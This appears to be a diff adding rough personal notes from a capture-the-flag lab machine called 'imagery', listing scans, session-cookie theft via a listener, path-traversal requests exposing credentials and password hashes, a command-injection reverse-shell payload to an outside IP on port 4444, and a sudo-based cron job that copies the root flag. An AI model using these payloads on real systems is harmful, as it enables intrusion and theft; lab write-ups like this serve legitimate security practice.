@@ -1,0 +1,45 @@
+1 Nmap scan 
+2. dirseach scan
+3. nuclei scan
+4. tried the poc but no luck 
+5. create php receiver and we get cookie
+   python -m http.server 9999                                                                                                                         
+Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
+10.10.11.88 - - [08/Nov/2025 08:05:03] code 404, message File not found
+10.10.11.88 - - [08/Nov/2025 08:05:03] "GET /receive.phpsession=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aQ8HxA.ENQBwfUrGKs53m92BKuvIwkXwqk HTTP/1.1" 404 -
+10.10.11.88 - - [08/Nov/2025 08:05:03] code 404, message File not found
+10.10.11.88 - - [08/Nov/2025 08:05:03] "GET /favicon.ico HTTP/1.1" 404 -
+with this we get admin panel but we need burp suite to catch the response
+
+6. use burp with cooke and access admin pannel use GET /admin/get_system_log?log_identifier=../../../../../home/web/web/config.py</body></html>
+   then use 
+ GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json
+ 
+ then get 
+             "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "isAdmin": false,
+            "displayId": "e5f6g7h8",
+            "login_attempts": 0,
+            "isTestuser": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+            
+            iambatman password
+            
+            loggin in we upload a picture and then try to modify it using crop and we capture this request using burp 
+and use this 
+";bash -c '/bin/bash -i 5<> /dev/tcp/10.10.14.120/4444 0<&5 1>&5 2>&5' ;"
+
+use this for shell stabilization python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+add linpeas.sh and run it to see priv poss
+
+
+
+5d9c1d507a3f76af1e5c97a3ad1eaa31
+01c3d2e5bdaf6134cec0a367cf53e535 supersmash
+
+
+we log in use sudo -l see charcol run it use -R make it no password then add cronjob to copy flag
+auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/pwned.txt && chmod 777 /tmp/pwned.txt" --name "pwned"
